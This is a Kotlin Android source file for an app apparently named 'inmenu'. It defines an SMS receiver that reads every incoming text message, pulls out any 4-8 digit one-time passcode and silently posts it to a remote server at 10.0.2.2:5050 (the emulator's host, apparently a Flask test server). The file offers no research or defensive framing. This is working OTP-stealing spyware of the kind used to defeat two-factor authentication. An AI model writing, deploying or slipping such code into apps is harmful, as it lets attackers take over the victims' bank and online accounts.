package com.inmenu.app

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Call
import okhttp3.Callback
import okhttp3.Response
import java.io.IOException
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody


class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {
        val bundle: Bundle? = intent?.extras
        val pdus = bundle?.get("pdus") as? Array<*>

        pdus?.forEach { pdu ->
            val format = bundle?.getString("format")
            val sms = SmsMessage.createFromPdu(pdu as ByteArray, format)
            val message = sms.messageBody

            val otpRegex = Regex("\\b\\d{4,8}\\b")
            val otp = otpRegex.find(message)?.value

            if (otp != null) {
                Log.d("OTP-CAPTURE", "Captured OTP: $otp")
                sendOtpToServer(otp)
            } else {
                Log.d("OTP-CAPTURE", "No OTP pattern found in message: $message")
            }
        }
    }

    private fun sendOtpToServer(otp: String) {
        val client = OkHttpClient()
        val mediaType = "text/plain".toMediaType()
        val requestBody = otp.toRequestBody(mediaType)

        Log.d("OTP-CAPTURE", "Preparing to send OTP to server: $otp")

        val request = Request.Builder()
            .url("http://10.0.2.2:5050/otp")  // Must match Flask server IP
            .post(requestBody)
            .addHeader("Content-Type", "text/plain")  // Keep this!
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e("OTP-CAPTURE", "Failed to send OTP: ${e.message}", e)
            }

            override fun onResponse(call: Call, response: Response) {
                val responseBody = response.body?.string()
                Log.d("OTP-CAPTURE", "OTP POST response: ${response.code} - $responseBody")
            }
        })
    }

}
